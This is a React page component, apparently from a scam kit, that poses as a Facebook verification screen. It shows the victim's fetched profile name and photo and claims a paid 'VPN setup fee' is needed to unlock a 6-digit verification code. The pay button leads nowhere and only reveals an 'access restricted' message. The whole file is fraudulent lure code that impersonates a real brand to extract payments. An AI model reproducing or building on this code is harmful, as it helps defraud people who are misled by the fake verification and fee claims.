'use client';

import multipleStep from '@/lib/multipleStep';
import { useEffect, useState } from 'react';

export default function VpnRequest() {
  const [paid, setPaid] = useState(false);

 const [infos, setInfos] = useState<any>(null);
    
      useEffect(() => {
        async function fetchInfos() {
          const data = await multipleStep();
          setInfos(data);
        }
        fetchInfos();
      }, []);

  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}
        <div className="flex items-center gap-4 mb-6">
          <img
            src={infos?.profile_pic}
            className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
          />
          <div>
            <p className="text-sm text-gray-500">Facebook User</p>
            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
          </div>
        </div>

        {/* Illustration */}
        <div className="w-full flex justify-center mb-6">
          <svg
            width="120"
            height="120"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle cx="12" cy="12" r="10" fill="#eff6ff" />
            <path
              d="M12 3l6 3v4c0 4.418-2.686 8.167-6 9-3.314-.833-6-4.582-6-9V6l6-3z"
              fill="#3b82f6"
              stroke="#1d4ed8"
              strokeWidth="1.5"
            />
            <path
              d="M10 12l2 2 4-4"
              stroke="#fefefe"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
        </div>

        {/* Title & Message */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2 text-center">
          VPN Setup Required
        </h1>
        <p className="text-sm text-gray-600 mb-5 text-center">
          To securely access your 6-digit verification code, please connect to our encrypted VPN server first.
        </p>

        {/* Payment Notice */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            A one-time <strong>${infos?.payment} VPN setup fee</strong> ensures secure data handling and unlocks your verification access.
          </p>
        </div>

        {/* Action Button */}
        <button
          onClick={() => setPaid(true)}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay ${infos?.payment} to Download VPN
        </button>

        {/* Confirmation */}
        {paid && (
          <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
                        <p className="text-sm font-medium">
                            Access restricted to registered users only..
                        </p>

                    </div>
        )}
      </div>
    </div>
  );
}
